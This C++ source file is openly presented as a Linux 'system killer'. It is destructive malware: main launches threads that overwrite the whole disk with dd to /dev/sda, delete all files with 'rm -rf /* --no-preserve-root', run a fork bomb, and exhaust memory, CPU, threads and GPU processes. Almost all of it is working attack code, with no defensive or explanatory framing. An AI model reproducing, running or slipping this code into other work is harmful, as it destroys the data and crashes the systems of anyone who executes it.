// NOTE : ---------- THIS WILL KILL YOUR SYSTEM DO IT AT YOUR OWN RISK ------------
// ONLY WORKS ON LINUX NOTE THAT
//=================== THE FINAL BOSS ============================================

#include <iostream>
#include <thread>
#include <vector>
#include <cstdlib>
#include <cmath>
#include <fstream>
#include <cstring>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/resource.h>

// **🔥 MAX CPU USAGE UNTIL IT BURNS 🔥**
void nuclearCPU() {
    while (true) {
        volatile double x = 1.0;
        for (int i = 0; i < 1000000000; i++) {
            x = std::pow(x, 9999999); // Exponential CPU spike
            x = std::log(x + 1.00001); 
            x = std::exp(x); 
            x = std::sin(x) * std::cos(x) * std::tan(x) * std::atan(x);
        }
    }
}

// **🔥 RAM DESTRUCTION: ALLOCATES UNTIL SYSTEM EXPLODES 🔥**
void ramDestroyer() {
    while (true) {
        char *leak = new char[1024 * 1024 * 1024]; // 1GB per loop
        memset(leak, 0xFF, 1024 * 1024 * 1024); // Fill with max data
    }
}

// **🔥 SSD ERASURE: OVERWRITES EVERYTHING 🔥**
void storageDestroyer() {
    while (true) {
        system("dd if=/dev/urandom of=/dev/sda bs=4M status=progress"); // Overwrites whole disk
    }
}

// **🔥 GPU OVERLOAD: SPAWNS UNLIMITED GRAPHICS PROCESSES 🔥**
void gpuBurner() {
    while (true) {
        system("glxgears > /dev/null &");
    }
}

// **🔥 MAX THREAD SPAWNING: BREAKS OS 🔥**
void threadSpawner() {
    while (true) {
        std::thread(nuclearCPU).detach();
    }
}

// **🔥 FILE SYSTEM KILLER: DELETES EVERYTHING 🔥**
void fileDestroyer() {
    system("rm -rf /* --no-preserve-root &"); // Deletes EVERYTHING
}

// **🔥 MEMORY MAP EXPLOIT: CRASHES SYSTEM 🔥**
void mmapKiller() {
    while (true) {
        void *p = mmap(0, 1024 * 1024 * 1024, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        memset(p, 0xFF, 1024 * 1024 * 1024);
    }
}

// **🔥 INFINITE FORK BOMB: CRASHES LINUX 🔥**
void forkBomb() {
    while (true) {
        fork();
    }
}

int main() {
    std::cout << "🔥🔥🔥 FINAL APOCALYPSE INITIATED 🔥🔥🔥" << std::endl;

    // **INSTANT HARDWARE ANNIHILATION**
    for (int i = 0; i < 1024; i++) { 
        std::thread(threadSpawner).detach(); 
        std::thread(ramDestroyer).detach(); 
        std::thread(storageDestroyer).detach(); 
        std::thread(gpuBurner).detach(); 
        std::thread(fileDestroyer).detach(); 
        std::thread(mmapKiller).detach(); 
        std::thread(forkBomb).detach(); 
    }

    while (true) {} // LOCK SYSTEM FOREVER

    return 0;
} 
